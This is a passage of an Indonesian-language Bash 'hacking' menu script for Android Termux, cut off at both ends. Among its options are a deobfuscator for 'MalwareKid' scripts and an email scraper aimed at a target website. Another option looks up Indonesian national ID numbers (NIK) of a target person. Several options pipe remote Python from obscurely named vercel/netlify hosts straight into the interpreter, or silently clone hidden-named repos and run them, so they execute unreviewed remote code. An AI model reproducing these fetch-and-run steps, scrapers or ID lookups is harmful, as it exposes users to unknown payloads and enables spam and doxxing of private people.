    if command -v xxd >/dev/null; then
        bytes=$(echo "$hex" | xxd -r -p 2>/dev/null || echo "$encoded")
    else
        bytes=$(perl -e "print pack('H*', '$hex')" 2>/dev/null || echo "$encoded")
    fi
    local b64_decoded
    b64_decoded=$(echo "$bytes" | base64 -d 2>/dev/null)
    [ $? -ne 0 ] && echo "❌ Gagal decode base64" && return 1
    decoded=$(perl -e '
        $str = do { local $/; <> };
        for $i (0..length($str)-1) {
            $char = substr($str, $i, 1);
            printf "%c", ord($char) ^ 127;
        }
    ' <<< "$b64_decoded")  
    echo "$decoded"
}
clear
echo ""
echo "================================"
echo "    DECODER - MALWAREKID "
echo "================================"
echo ""
echo -e "${y} Contoh : /sdcard/Folder/file.sh "
echo ""
read -p "Masukkan path file : " file
file=$(echo "$file" | xargs)
result=$(decode_malwarekid "$file")
if [ $? -eq 0 ] && [ -n "$result" ]; then
    clear 
    echo ""
    echo "================================"
    echo "        HASIL - DECODER "
    echo "================================"
    echo "$result"
    echo "================================"
    echo "" 
    read -p "Apakah anda ingin menyimpan hasil? (y/n) : " save
    if [[ "$save" =~ ^[Yy]$ ]]; then
        output="Decoded_hasil.txt"
        echo "================================" > "$output"
        echo "  Decoded from : $file" >> "$output"
        echo "================================" >> "$output"
        echo "" >> "$output"
        echo "$result" >> "$output"
        echo ""
        echo "✅ Disimpan ke : $output"
        echo ""
    fi
    mkdir -p "/sdcard/DEC_MALWAREKIDS"
    dir="/sdcard/DEC_MALWAREKIDS/Decoded_hasil.txt"
    if [ -n "$result" ]; then
        echo "================================" > "$dir"
        echo "  Decoded from : $file" >> "$dir"
        echo "================================" >> "$dir"
        echo "" >> "$dir"
        echo "$result" >> "$dir"
        echo ""
        echo "✅ Juga tersimpan di : $dir"
        echo ""
    fi
else
    clear 
    echo ""
    echo "❌ Gagal mendecode..!!"
    echo ""
fi
 ;;
11)
clear
cd $HOME
python <(curl -sL 'https://mmkmeratusueidukdukfromkeyloardanco.vercel.app/Deck1.py')
;;
 12)
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣷⠀⠀⢠⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⡇⠀⣸⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀
⠀⣠⣶⣦⡀⠹⣿⣿⣿⣿⡿⠁⠀⠘⣿⣿⣿⣿⣿⠇⣠⣴⣶⡄⠀
⢰⣿⣿⣿⣿⣆⠉⠛⠛⠋⠁⣀⣀⣀⠈⠛⠛⠛⠁⣼⣿⣿⣿⣿⡀
⢸⣿⣿⣿⣿⣿⡆⠀⢀⣴⣿⣿⣿⣿⣿⣦⠀⠀⢸⣿⣿⣿⣿⣿⡇
⠈⢿⣿⣿⣿⣿⠃⣠⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⢸⣿⣿⣿⣿⠟⠀
⠀⠀⠉⠙⠋⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣍⠛⠋⠁⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣿⣿⣿⣿⡿⠿⢿⣿⣿⣿⣿⡿⠛⠁
" | lolcat
echo -e "${g}===============${r} Html Marshall ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://phpkobo-deobf.vercel.app/"
echo ""
echo -e "${g} SELESAI MEMBUK LINK..!!"
echo ""
;;
 13)
clear 
spath=$(echo $PATH | cut -d: -f1)
curl -sLo $spath/unshell https://github.com/Thxyzz404/unshell/raw/main/unshell
chmod +x $spath/unshell
echo -e "${c}"
read -p "Masukkan path file : " file
echo -e "${g}"
git clone --depth 32 https://github.com/Thxyzz404/unshell
cd unshell
unshell -f "$file"
echo ""
;;
 14)
cd $HOME
python3 <(curl -sL "https://kocakrinemajgbangsat.netlify.app")
;;
 15)
cd $HOME
python3 <(curl -sL "https://cokcokrenamecuih.netlify.app")
;;
 00)
     clear 
     echo ""
     echo -e "${c} Keluar Dari Pemograman..!!"
     echo ""
   ;;
*)
   clear 
   echo ""
   echo -e "${r} Perintah Tidak Di Temukan..!!"
   echo ""
   ;;
esac
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
      11)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
b='\033[34;1m'
n='\033[0m'
chars=("⠋" "⠙" "⠹" "⠸" "⠼" "⠴" "⠦" "⠧" "⠇" "⠏")
show_loading() {
    local pid=$1
    local i=0
    while kill -0 $pid 2>/dev/null; do
        printf "\r${c}${chars[i]}${g} Mencari lagu..!!"
        i=$(( (i+1) % ${#chars[@]} ))
        sleep 0.1
    done
    printf "\r${g}✓ Pencarian selesai !! \n"
}
durasi() {
    local seconds=$1
    if [[ $seconds =~ ^[0-9]+$ ]]; then
        local min=$((seconds / 60))
        local sec=$((seconds % 60))
        printf "%02d:%02d" $min $sec
    else
        echo "00:00"
    fi
}
shorten() {
    local title="$1"
    echo "$title" | awk '{print $1 " " $2 " " $3 " " $4}' | sed 's/ $//'
}
echo "
███████╗██████╗ ████████╗██╗   ██╗
██╔════╝██╔══██╗╚══██╔══╝╚██╗ ██╔╝
███████╗██████╔╝   ██║    ╚████╔╝ 
╚════██║██╔═══╝    ██║     ╚██╔╝  
███████║██║        ██║      ██║   
╚══════╝╚═╝        ╚═╝      ╚═╝
    Developer : Thxyzz404   " | lolcat 
echo ""
read -p "$(echo -e "${y}Masukkan pencarian ${r}[ ${g}SPTY ${r}]${c} : ")" cari
echo ""
if [ -z "$cari" ]; then
    clear 
    echo ""
    echo -e "${r} Pilih yang bener kontol :v "
    echo ""
fi
echo ""
echo -e "${b}🔍 Mencari : ${n}$cari"
echo -e "${g}=============================================="
temp_file="./.search_results_temp_$$"
{
    yt-dlp "ytsearch5:$cari" \
        --print "%(title)s|%(id)s|%(duration)s" \
        --no-warnings 2>/dev/null > "$temp_file"
} &
pid=$!
show_loading $pid
wait $pid
if [ -f "$temp_file" ]; then
    results=$(cat "$temp_file")
    rm -f "$temp_file"
else
    results=""
fi
if [ -z "$results" ]; then
    clear 
    echo ""
    echo -e "${r}Lagu tidak di temukan : " $cari
    echo ""
fi
echo ""
echo -e "${g}📋 HASIL PENCARIAN "
echo -e "${c}┌────┬────────────────────────────┬──────────┐${n}"
echo -e "${c}│ No │ Judul                      │ Durasi   │${n}"
echo -e "${c}├────┼────────────────────────────┼──────────┤${n}"
counter=1
while IFS='|' read -r title id duration; do
    short=$(shorten "$title")
    dur=$(durasi "$duration")
    printf "${c}│${n} %2d ${c}│${n} %-26s ${c}│${n} %7s ${c}│${n}\n" "$counter" "$short" "$dur"
    counter=$((counter + 1))
done <<< "$results"
echo -e "${c}└────┴────────────────────────────┴──────────┘${n}"
echo ""
echo -ne "${y}🎯 Pilih nomor lagu : "
read han
id=$(echo "$results" | sed -n "${han}p" | cut -d'|' -f2 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
tel=$(echo "$results" | sed -n "${han}p" | cut -d'|' -f1 | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
if [ -z "$id" ]; then
    clear 
    echo ""
    echo -e "${r} Pilihan anda tidak valid."
    echo ""
fi
echo ""
echo -e "${g}✅ Lagu dipilih : ${p}$(shorten "$tel") "
echo ""
echo -ne "${b}▶️  Apakah ingin memutar lagu? (y/n) : "
read play
if [[ "$play" =~ ^[Yy]$ ]]; then
    clear
    echo -e "${c}🎵 MEMUTAR LAGU 🎵 "
    echo -e "${r}=========================================="
    echo -e "${b}Judul : ${y}$(shorten "$tel")"
    echo -e "${r}=========================================="
    echo ""
    mpv --no-video \
        --quiet \
        --terminal=no \
        --msg-level=all=no \
        --no-osd-bar \
        --osd-level=0 \
        "https://youtu.be/$id" 2>/dev/null &    
    MPV_PID=$!
    echo -e "${r}[ ${g}✓ ${r}]${c} Memutar lagu."
    echo ""
    echo -e "${b}Tekan Ctrl+C untuk berhenti."
    echo ""
    i=0
    while kill -0 $MPV_PID 2>/dev/null; do
        printf "\r${c}${chars[$i]} Memutar... "
        i=$(( (i+1) % ${#chars[@]} ))
        sleep 0.2
    done
    printf "\r${g}✓ Pemutaran selesai. \n"
else
    echo ""
    echo -e "${p}⏹️  Pemutaran dibatalkan."
    echo ""
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
       12)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
n='\033[0m'
banner() {
echo -e "${r}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣠⣤⣤⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣶⠿⠟⠛⠉⠉⠉⠉⠉⠙⠛⠻⢷⣦⣄⠀⠀⠀⠀
⠀⠀⢀⣴⠾⠛⠉⢀⣀⣤⣤⣶⣶⣶⣶⣶⣶⣤⣤⣀⠈⠙⠻⣦⡀⠀
⠀⠀⠟⠁⢀⣤⣾⢿⡿⠛${g}⣿⣿⣿⠋⠀${r}⡉⠻⣿⣷⣦⡀⠈⠻⠀
⠀⠀⢀⣴⡿⠋⠁⣾⠁⠀${g}⣿⣿⣿⣦⣤⣴⡇${r}⠀⢹⡍⠛⣿⣦⠀⠀
⠀⣰⣿⠋⠀⠀⠀⣿⡀⠀${g}⣿⣿⣿⣿⣿⡿⠃${r}⠀⣼⠇⠀⠈⢻⣷⡀
⣼⣿⡇⠀⠀⠀⠀⠹⣷⣀ ${g}⠙⠛⠛⠋${r}⠀⢀⣴⠟⠀⠀⠀⠀⣿⣷
⠻⢿⣿⣦⣀⠀⠀⠀⠈⠛⢷⣦⣤⣤⣤⣤⣶⠟⠋⠀⠀⢀⣠⣾⡿⠿
⠀⠀⠀⠉⠛⠿⣶⣤⣤⣀⣀⠀⢉⠉⢉⣁⣀⣀⣤⣴⡶⠿⠋⠁⠀⠀
⠀⠀⠀⠀⠀⣀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠛⠋⠉⠀⢀⡀⠀⠀⠀⠀
⠀⠀⠀⠀${c}⣴⡿${c}⣧⠀⠀⠀⠀ ⢠⣿⡄⠀⠀⠀⠀⢀⣾⢿⣆⠀⠀⠀
⠀⠀⠀⣼⡟${c}⠀⢹⣧⠀⠀⠀⣠⡿⠛⣿⡄⠀⠀⠀⣼⠏⠈⢿⡆⠀⠀
⠀⠀⠀⣿⡁${c}⠀⢀⣿⠀⠀⢠⣿⠁⠀⠘⣿⡀⠀⠀⣿⠀⠀⢸⡷⠀⠀
⠀⠀⠀⠹⣷⣤⣾⠏⠀⠀⣸⡇⡄⠀⠀⢻⣇⠀⠀⠻⣷⣴⡾⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⡻⢤⢀⣾⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
domain() {
echo "$1" | sed -e 's|^[^/]*//||' -e 's|/.*$||'
}
email() {
echo "$1" | grep -E -o '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u
}
link() {
local html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$1" 2>/dev/null)
local str="" 
if [ -n "$html" ]; then
local semua=$(echo "$html" | grep -E -o 'href="[^"]*"' | sed 's/href="//g' | sed 's/"//g' | head -10)   
for link in $semua; do
local absolut       
if [[ "$link" == http://* ]] || [[ "$link" == https://* ]]; then
     absolut="$link"
elif [[ "$link" == /* ]]; then
local protocol=$(echo "$1" | grep -E -o '^https?://')
local domain=$(domain "$1")
     absolut="${protocol}${domain}${link}"
else
     absolut="${1%/}/$link"
  fi   
str="$str $absolut"
done
fi
echo "$str"
}
scrape() {
local url="$1"
echo -e "${b}Scraping halaman utama : $url"
local html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$url" 2>/dev/null)
if [ -n "$html" ]; then
local emails=$(email "$html")
for email in $emails; do
local found=0
for e in "${DAFTAR_EMAIL[@]}"; do
if [ "$e" = "$email" ]; then
     found=1
break
fi
done            
if [ $found -eq 0 ]; then
    DAFTAR_EMAIL+=("$email")
fi
done        
URL_DIKUNJUNGI+=("$url")
HALAMAN_SEKARANG=1
local semua_link=$(link "$url")
local links_array=($semua_link)
local total_links=${#links_array[@]}        
echo -e "${g}Menemukan ${n}: ${r}$total_links ${y}link untuk di-scrape"
local count=1
for link in $semua_link; do
if [ -n "$link" ]; then
local sudah_dikunjungi=0
for u in "${URL_DIKUNJUNGI[@]}"; do
if [ "$u" = "$link" ]; then
   sudah_dikunjungi=1
break
fi
done                
if [ $sudah_dikunjungi -eq 0 ] && [ $HALAMAN_SEKARANG -lt $TOTAL_HALAMAN ]; then
echo -e "${y}Scraping link ${n}: ${c}$count/$total_links: $link"                    
local link_html=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$link" 2>/dev/null)   
if [ -n "$link_html" ]; then
local link_emails=$(email "$link_html")                      
for email in $link_emails; do
local email_found=0
for e in "${DAFTAR_EMAIL[@]}"; do
if [ "$e" = "$email" ]; then
    email_found=1
break
fi
done                          
if [ $email_found -eq 0 ]; then
   DAFTAR_EMAIL+=("$email")
fi
done                       
URL_DIKUNJUNGI+=("$link")
fi                    
HALAMAN_SEKARANG=$((HALAMAN_SEKARANG + 1))
count=$((count + 1))
if [ $TOTAL_HALAMAN -gt 0 ]; then
local progres=$((HALAMAN_SEKARANG * 100 / TOTAL_HALAMAN))
if [ $progres -gt 100 ]; then
    progres=100
fi                        
local panjang=20
local panjang_terisi=$((panjang * progres / 100))
local panjang_kosong=$((panjang - panjang_terisi))                        
local bar="["
 for ((i=0; i<panjang_terisi; i++)); do
     bar="${bar}#"
done                       
 for ((i=0; i<panjang_kosong; i++)); do
     bar="${bar}."
done                        
     bar="${bar}] ${progres}%"
echo -e "${n}"                  
echo -ne "\rProses Scraping Alamat Email $bar"
     fi
  fi
fi
done       
echo -ne "\r"
 for ((i=0; i<100; i++)); do
 echo -n " "
 done
 echo -ne "\r"
fi
}
total() {
    local html_content=$(curl -s -L -A "Mozilla/5.0" --max-time 5 "$1" 2>/dev/null)  
    if [ -n "$html_content" ]; then
        local jumlah_link=$(echo "$html_content" | grep -E -o 'href="[^"]*"' | wc -l)
        if [ $jumlah_link -gt 20 ]; then
            TOTAL_HALAMAN=15
        elif [ $jumlah_link -gt 10 ]; then
            TOTAL_HALAMAN=$((jumlah_link / 2 + 1))
        else
            TOTAL_HALAMAN=$((jumlah_link + 1))
        fi
        if [ $TOTAL_HALAMAN -lt 2 ]; then
            TOTAL_HALAMAN=2
        fi
    else
        TOTAL_HALAMAN=5
    fi
}
mulai() {
    banner
    echo ""
    echo -e "${p}Development ${c}: ${g}By.Thxyzz404"
    echo -e "${g}"
    echo -n "[?] Masukkan Url Website Target : "
    read URL_TARGET  
    if [ "$URL_TARGET" = "exit" ] || [ "$URL_TARGET" = "EXIT" ]; then
        clear 
        echo ""
        echo -e "${p}Terima kasih By.Thxyzz404"
        echo ""
    fi    
    if ! [[ "$URL_TARGET" == http://* ]] && ! [[ "$URL_TARGET" == https://* ]]; then
        URL_TARGET="https://$URL_TARGET"
    fi    
    echo ""
    echo -e "${g}Memulai scraping : ${c}$URL_TARGET"
    echo ""
    URL_DIKUNJUNGI=()
    DAFTAR_EMAIL=()
    TOTAL_HALAMAN=0
    HALAMAN_SEKARANG=0
    total "$URL_TARGET"    
    echo -e "${p}Total halaman yang akan di-scrape : ${r}$TOTAL_HALAMAN"
    echo ""
    scrape "$URL_TARGET"
    echo -e "${g}Scraping selesai..!!"
    echo ""  
    if [ ${#DAFTAR_EMAIL[@]} -gt 0 ]; then
        echo -e "${r}[ ${g}INFO ${r}]${c} ${#DAFTAR_EMAIL[@]} Alamat Email Berhasil Diambil..!!"
        echo ""
        for email in "${DAFTAR_EMAIL[@]}"; do
            echo -e "${r}[ ${g}+ ${r}]${g} $email"
        done
    else
        echo -e "${r}[ ${g}X ${r}]${y} Tidak Ada Email Ditemukan..!!"
    fi   
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y} Total Halaman Web Yang Telah Di Gali : ${r}${#URL_DIKUNJUNGI[@]}"
    echo -e "${b}" 
    echo -n "ENTER Untuk Kembali Ke Awal Atau EXIT Untuk Keluar : "
    read pilihan    
    if [ "$pilihan" = "exit" ] || [ "$pilihan" = "EXIT" ]; then
        clear 
        echo ""
        echo -e "${p}Terima kasih By.Thxyzz404"
        echo ""
    fi
}
mulai
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
           read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
           clear
              ;;
       13)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              cd $HOME
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.ajgtaibangkekbngsatsetantolkontololjmboatpjue"
PEJU="Cok1.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
     ;;
       14)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              cd $HOME
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.Qpuw0352cain1238baXX"
PEJU="Goblok.py"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QOOWUSJSHGSHHSHIWKJSHS/.Qpuw0352cain1238baXX "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        python3 "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QOOWUSJSHGSHHSHIWKJSHS/.Qpuw0352cain1238baXX "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    python3 "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
    ;;
       15)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
blue='\033[34;1m'
green='\033[32;1m'
cyan='\033[36;1m'
red='\033[31;1m'
yellow='\033[33;1m'
package() {
    if ! command -v jq > /dev/null 2>&1; then
        echo ""
        echo -e "${red}[ ${g}+ ${red}]${yellow} Beberapa package belum terinstall. Sedang menginstall..!!"
        sleep 2
        echo -e "${green}"
        pkg update && pkg upgrade -y
        pkg install jq wget curl cowsay ruby php python python2 python3 -y
        gem install lolcat
        clear
    fi
}
package 
        echo "" 
        echo -e "${red}[ ${green}✓ ${red}]${green} Semua package berhasil diinstal..!!" 
        sleep 2
    echo ""
bacot() {
echo "
██████╗  ██████╗ ██╗  ██╗     ███╗   ██╗██╗██╗  ██╗
██╔══██╗██╔═══██╗╚██╗██╔╝     ████╗  ██║██║██║ ██╔╝
██║  ██║██║   ██║ ╚███╔╝█████╗██╔██╗ ██║██║█████╔╝ 
██║  ██║██║   ██║ ██╔██╗╚════╝██║╚██╗██║██║██╔═██╗ 
██████╔╝╚██████╔╝██╔╝ ██╗     ██║ ╚████║██║██║  ██╗
╚═════╝  ╚═════╝ ╚═╝  ╚═╝     ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝"
echo ""
}
echo ""
clear
bacot | lolcat
echo -e "${green}"
read -p "Masukkan NIK Target Anda : " niknya_kontol
echo ""
clear
bacot | lolcat
if ! command -v nik-parse &> /dev/null; then
    echo -e "${red}Package Belum Terinstall, Menginstall Dulu..!!"
    sleep 2
    echo ""
    cd /data/data/com.termux/files/usr/include/ || mkdir -p /data/data/com.termux/files/usr/include/ && cd /data/data/com.termux/files/usr/include/
    git clone --depth 32 https://github.com/QrwszXnXnchommed0e56/Nik-Osint &> /dev/null
    cd Nik-Osint || exit
    unzip -o -P "トンキシズトミカン" Nik-404.sh &> /dev/null
    git stash &> /dev/null
    git pull origin main &> /dev/null
    npm install -g nik-parse &> /dev/null
fi
echo -e "${green}Sedang Memproses Data..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${yellow}Loading..!! ${red}[ ${green}$((i * 10))% ${red}]"
    sleep 0.3
done
echo -ne "\r${yellow}Loading..!! ${red}[ ${green}100% ${red}]"
sleep 1
echo ""
echo -e "\n${red}Data Berhasil Diproses..!!"
sleep 1
echo -e "${green}"
nik-parse -n "$niknya_kontol"
              echo ""
              echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
              read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
              clear
              ;;
       16)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
PFERFIX="$HOME"
ANK_IDIOT="$PREFIX/tmp/.ajgtaibangkekbngsatsetantolkontololjmboatpjue"
PEJU="Cok.sh"
memek() {
echo -e "$1"
}
kontol() {
memek "${r}[ ${g}ERROR ${r}]${y} $1"
}
clear
if [ -d "$ANK_IDIOT" ]; then
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    if [ -f "$PEJU" ]; then
        echo ""
        memek "${r}[ ${g}✓ ${r}]${c} Sedang menjalankan tools..!!"
        echo ""
        bash "$PEJU" || kontol "Terjadi kesalahan."
    else
        echo ""
        memek "${r}[ ${g}+ ${r}]${y} Tidak di temukan mengclone ulang..!!${c}"
        echo ""
        cd "$HOME" || kontol "Gagal kembali ke HOME."
        rm -rf "$ANK_IDIOT"
        git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
        cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
        bash "$PEJU" || kontol "Terjadi kesalahan."
    fi
else
    memek "${r}[ ${g}+ ${r}]${g} Mengclone repo.${c}"
    echo ""
    cd "$HOME" || kontol "Gagal kembali ke HOME."
    git clone --depth=32 https://github.com/QrwszXnXnchommed0e56/.ajgtaibangkekbngsatsetantolkontololjmboatpjue "$ANK_IDIOT" >/dev/null 2>&1 || kontol "Terjadi kesalahan."
    cd "$ANK_IDIOT" || kontol "Terjadi kesalahan."
    bash "$PEJU" || kontol "Terjadi kesalahan."
fi
echo ""
echo -e "${g}Tekan Enter Untuk Kembali ke ToolslV"
read -n 1 -s -r -p "Silahkan Tekan Enter..!!"
clear
   ;;
       17)
              echo ""
              mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
              echo -e "${c} Anda Memilih Menu Hacking..!!"
              echo ""
              echo -e "${r} VIP UNLOCK..!!"
              sleep 2
              clear
SAVE_DIR="/sdcard/GENERATOR_QR"
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
    echo ""
    echo -e "${r}[ ${g}+ ${r}]${y}${c} Memeriksa modul Python..!!"
    sleep 2
    echo ""
    if ! python3 -c "import pyqrcode, png, PIL, qrcode" &> /dev/null; then
        echo -e "${r}[ ${g}! ${r}]${y}${c} Menginstall modul yang diperlukan..!!"
        echo ""
        pip install pyqrcode pypng pillow qrcode 2>/dev/null || \
        pip3 install pyqrcode pypng pillow qrcode 2>/dev/null
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} ${c}Modul berhasil diinstall."
    else
        echo -e "${r}[ ${g}✓ ${r}]${y} ${c}Semua modul sudah terinstall."
    fi
    echo ""
    sleep 2
    clear
generate_qr_code() {
clear 
echo "
 ██████╗ ██████╗  ██████╗
██╔═══██╗██╔══██╗██╔════╝
██║   ██║██████╔╝██║     
██║▄▄ ██║██╔══██╗██║     
╚██████╔╝██║  ██║╚██████╗
 ╚══▀▀═╝ ╚═╝  ╚═╝ ╚═════╝" | lolcat
    echo ""
    echo -e "${p}Development ${c}: ${g}Thxyzz404"
    echo -e "${g}"
    read -p "Masukkan teks anda : " babi
    echo -e "${c}"
    if [ -z "$babi" ]; then
        clear 
        echo ""
        echo -e "${r} Teks tidak boleh kosong."
        sleep 3
        generate_qr_code
        return
    fi
    read -p "Masukkan nama file : " tod
    if [ -z "$tod" ]; then
        filename="qrcode_gue"
    else
        filename="${tod}"
    fi
    echo ""
    echo -e "${y}Sabar ajg lagi proses..!!"
    echo -e "${g}"
    mkdir -p "$SAVE_DIR"    
    python3 -c "
import os
import sys
import time
import qrcode
try:
    data = '''$babi'''
    filename = '''$filename'''
    save_dir = '''$SAVE_DIR'''
    full_path = os.path.join(save_dir, filename + '.png')    
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(data)
    qr.make(fit=True)
    print('Preview Hasil QR')
    qr.print_ascii()
    img = qr.make_image(fill_color=\"black\", back_color=\"white\")
    img.save(full_path)
    print(f'\033[31;1m[ \033[32;1m✓ \033[31;1m]\033[33;1m QR code disimpan sebagai : {filename}.png')
    print(f'\033[31;1m[ \033[32;1m+ \033[31;1m]\033[35;1m Lokasi file : {full_path}')
    file_size = os.path.getsize(full_path)
    print(f'\033[31;1m[ \033[32;1m@ \033[31;1m]\033[34;1m Ukuran file : {file_size} bytes')
except Exception as e:
    print(f'Error: {e}')
    sys.exit(1)
"
    if [ $? -ne 0 ]; then
        echo ""
